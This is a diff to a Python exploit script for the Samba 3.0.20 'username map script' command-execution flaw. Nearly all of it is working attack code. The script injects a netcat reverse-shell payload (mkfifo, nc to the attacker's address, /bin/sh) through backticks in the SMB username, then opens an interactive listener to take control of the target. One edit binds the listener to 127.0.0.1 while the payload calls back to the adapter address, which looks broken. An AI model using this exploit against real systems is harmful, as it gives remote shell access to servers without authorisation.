@@ -21,10 +21,12 @@ ip = args.ip
 adapter = args.adapter
 port = args.port
 
+print("\n\tSamba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution\n")
+
 # get adapter ip and open port
 local_ip = ni.ifaddresses(adapter)[ni.AF_INET][0]['addr']
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(("",0))
+s.bind(("127.0.0.1",0))
 s.listen(1)
 s.getsockname()[1]
 local_port = s.getsockname()[1]
@@ -35,14 +37,15 @@ listener = listen(local_port)
 
 # smb rce
 # credit: https://github.com/pulkit-mital/samba-usermap-script/blob/main/samba_usermap_script.py
-payload = f'mkfifo /tmp/userX; nc {local_ip} {local_port} 0</tmp/userX | /bin/sh >/tmp/userX 2>&1; rm /tmp/userX'
+payload = f'mkfifo /tmp/usermap; nc {local_ip} {local_port} 0</tmp/usermap | /bin/sh >/tmp/usermap 2>&1; rm /tmp/usermap'
 username = "/=`nohup " + payload + "`"
 smb = SMBConnection(username, "", "", "")
 try:
     smb.connect(ip, port, timeout=1)
 except:
+    smb.close()
     print("\tPayload Sent")
 
 # reverse shell
 listener.interactive()
-
+listener.close()
